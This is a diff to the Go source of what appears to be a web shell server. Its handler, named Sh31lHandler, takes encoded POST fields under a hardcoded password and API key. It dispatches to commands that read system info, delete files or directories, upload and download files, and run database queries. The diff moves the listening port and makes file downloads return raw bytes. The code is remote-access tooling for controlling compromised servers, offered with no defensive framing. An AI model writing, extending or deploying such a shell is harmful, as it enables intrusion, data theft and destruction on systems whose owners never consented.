@@ -23,7 +23,7 @@ import (
 	"time"
 )
 
-const LISTEN = "0.0.0.0:62847"
+const LISTEN = "0.0.0.0:65201"
 const PWD = "S1lLyAQNXYUASEDFLVBWSFWECSSVS1lLy"
 const API = "S1lLyXCVBRTSDBAVWERHHWARTGJRS1lLy"
 const ENCODER = "base64"           // "" or "base64" or "hex"
@@ -343,7 +343,7 @@ func Sh31lHandler(context *gin.Context) {
 	z1 := Decoder(context.PostForm("z1"))
 	z2 := Decoder(context.PostForm("z2"))
 	z3 := Decoder(context.PostForm("z3"))
-
+	fileContent := []byte("")
 	switch values {
 	case "A":
 		ret = BaseInfo()
@@ -356,7 +356,7 @@ func Sh31lHandler(context *gin.Context) {
 	case "E":
 		ret = DeleteFileOrDirCode(z1)
 	case "F":
-		ret = string(DownloadFileCode(z1))
+		fileContent = DownloadFileCode(z1)
 	case "U":
 		ret = UploadFileCode(z1, z2)
 	case "H":
@@ -380,7 +380,13 @@ func Sh31lHandler(context *gin.Context) {
 	case "Q":
 		ret = query(z0, z1, z2)
 	}
-	context.String(http.StatusOK, OUT_PREFIX+Encoder(ret)+OUT_SUFFIX)
+	if values == "F" {
+		_, _ = context.Writer.Write([]byte(OUT_PREFIX))
+		_, _ = context.Writer.Write(fileContent)
+		_, _ = context.Writer.Write([]byte(OUT_SUFFIX))
+	} else {
+		context.String(http.StatusOK, OUT_PREFIX+Encoder(ret)+OUT_SUFFIX)
+	}
 }
 
 func r404(c *gin.Context) {
